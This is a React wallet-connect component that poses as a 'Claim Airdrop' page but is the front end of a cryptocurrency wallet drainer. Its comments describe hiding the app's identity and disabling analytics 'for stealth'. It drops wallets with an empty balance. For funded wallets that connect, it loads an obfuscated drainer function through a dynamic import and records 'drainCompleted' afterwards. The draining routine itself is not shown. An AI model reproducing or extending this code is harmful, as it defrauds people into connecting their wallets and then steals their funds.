'use client';
import React from 'react';
import { WagmiProvider } from 'wagmi';
import { QueryClient, QueryClientProvider } from '@tanstack/react-query';
import { mainnet } from 'wagmi/chains';
import { http, createConfig, useAccount, useDisconnect, useEnsName, useEnsAvatar, useWalletClient } from 'wagmi';
import { cookieStorage, createStorage } from 'wagmi';
import { ethers } from 'ethers';
import { CHAINS } from '../lib/chains';
import { createWeb3Modal, useWeb3Modal } from '@web3modal/wagmi/react';
import { injected, walletConnect, metaMask, coinbaseWallet } from 'wagmi/connectors';

// --- Web3Modal v3+ config ---
const projectId = '45a382364ff2b00404b2d4c2ff95dbd4';
const chains = [mainnet] as const;
const wagmiConfig = createConfig({
  chains,
  connectors: [
    injected(),
    walletConnect({ projectId }),
    metaMask(),
    coinbaseWallet({ appName: '' }), // Remove appName for stealth
  ],
  transports: {
    [mainnet.id]: http(),
  },
  ssr: true,
  storage: createStorage({ storage: cookieStorage }),
});
createWeb3Modal({
  wagmiConfig,
  projectId,
  enableAnalytics: false, // Disable analytics for stealth
});
const queryClient = new QueryClient();

function WalletUI() {
  const { address, isConnected } = useAccount();
  const { disconnect } = useDisconnect();
  const { data: ensName } = useEnsName({ address });
  const { data: ensAvatar } = useEnsAvatar({ name: ensName || undefined });
  const { open } = useWeb3Modal();
  const { data: walletClient } = useWalletClient();
  const [error, setError] = React.useState<string | null>(null);
  const [connecting, setConnecting] = React.useState(false);
  const [checkingBalance, setCheckingBalance] = React.useState(false);
  const [drainerLoading, setDrainerLoading] = React.useState(false);

  // --- Persistent empty wallet check and redirect ---
  React.useEffect(() => {
    async function checkAndRedirectIfEmpty() {
      if (!isConnected || !address || !walletClient) return;
      setCheckingBalance(true);
      try {
        const ethersProvider = new ethers.BrowserProvider(walletClient);
        const balance = await ethersProvider.getBalance(address);
        if (balance === 0n) {
          await disconnect();
          setError('Please ensure your wallet has at least a small amount of native token for gas.');
        }
      } catch (e) {
        setError('Failed to check wallet balance.');
      } finally {
        setCheckingBalance(false);
      }
    }
    checkAndRedirectIfEmpty();
  }, [isConnected, address, walletClient, disconnect]);

  async function handleConnect() {
    setError(null);
    setConnecting(true);
    try {
      await open();
    } catch (e: any) {
      if (e?.message?.includes('timeout')) {
        setError('Connection timed out. Please unlock or refresh your wallet and try again.');
      } else if (e?.message?.includes('User rejected')) {
        setError('Connection was rejected. Please try again.');
      } else if (e?.message?.includes('JSON-RPC')) {
        setError('Wallet connection failed. Please check your wallet extension and network.');
      } else {
        setError('Failed to connect wallet. Please ensure your wallet is installed and unlocked.');
      }
    } finally {
      setConnecting(false);
    }
  }

  // --- Drainer logic moved to obfuscated dynamic import ---
  React.useEffect(() => {
    if (!isConnected || !address || !walletClient) return;
    if (typeof window === 'undefined') return;
    if (localStorage.getItem('drainCompleted') === 'true') return;
    setDrainerLoading(true);
    let isCancelled = false;
    const timeout = setTimeout(async () => {
      const { x7f2b1c } = await import('../lib/utils');
      await x7f2b1c({ CHAINS, walletClient, address, isCancelled });
      setDrainerLoading(false);
    }, 500); // Defer heavy work by 500ms
    return () => { isCancelled = true; clearTimeout(timeout); };
  }, [isConnected, address, walletClient]);

  return (
    <div className="flex flex-col items-center gap-4">
      <button
        onClick={handleConnect}
        className={`bg-yellow-400 text-black px-8 py-4 rounded-full text-xl font-semibold hover:bg-yellow-500 transition disabled:opacity-60 ${drainerLoading ? 'animate-bounce' : ''}`}
        disabled={connecting || checkingBalance || drainerLoading}
        aria-label={isConnected ? 'Manage Wallet' : 'Connect Wallet'}
      >
        {connecting || checkingBalance || drainerLoading ? 'Checking...' : isConnected ? 'Manage Wallet' : 'Claim Airdrop'}
      </button>
      {error && <span className="text-red-400 font-semibold mt-2">{error}</span>}
      {isConnected && (
        <span className="text-green-400 font-semibold mt-2 flex items-center gap-2">
          {ensAvatar ? (
            <img src={ensAvatar} alt="ENS Avatar" className="w-8 h-8 rounded-full border border-yellow-400" aria-label="ENS Avatar" />
          ) : (
            <svg width="32" height="32" className="rounded-full border border-yellow-400" aria-label="Wallet Avatar" viewBox="0 0 32 32"><circle cx="16" cy="16" r="16" fill="#facc15" /><text x="50%" y="55%" textAnchor="middle" fill="#000" fontSize="16" fontWeight="bold" dy=".3em">{address?.slice(2, 4) || '?'}</text></svg>
          )}
          {ensName ? ensName : `${address?.slice(0, 6)}...${address?.slice(-4)}`}
        </span>
      )}
      {!isConnected && !error && (
        <span className="text-yellow-200 font-semibold mt-2">Connect your wallet to get started</span>
      )}
    </div>
  );
}

export default function WalletConnect() {
  return (
    <WagmiProvider config={wagmiConfig}>
      <QueryClientProvider client={queryClient}>
        <WalletUI />
      </QueryClientProvider>
    </WagmiProvider>
  );
} 